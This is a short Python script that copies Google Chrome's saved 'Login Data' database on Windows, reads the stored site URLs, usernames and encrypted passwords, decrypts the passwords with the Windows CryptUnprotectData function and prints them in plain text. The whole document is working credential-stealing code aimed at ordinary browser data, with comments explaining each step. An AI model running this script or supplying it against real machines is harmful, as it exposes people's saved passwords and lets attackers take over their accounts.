
import os 
import sqlite3
import win32crypt


sourceData = os.getenv("LOCALAPPDATA")  + "\\Google\\Chrome\\User Data\\Default\\Login Data"
#C:\Users\gasbugs\AppData\Local\Google\Chrome\User Data\Default\Login Data
destData = "copied_login_data.db"

with open(sourceData, 'rb') as f:
    data = f.read()
with open(destData,'wb') as f:
    f.write(data)

# Connect to the copied Database
with sqlite3.connect(destData) as conn:
    c = conn.cursor()
    c.execute('SELECT action_url, username_value, password_value FROM logins') 

    # To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.
    for raw in c.fetchall():
        if raw[0] and raw[1] and  raw[2]:
            pw = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it  
            print("""
url: {}
id: {}
pw: {}""".format(raw[0],raw[1],pw))# print the action_url (raw[0]) and print the username_value (raw[1])
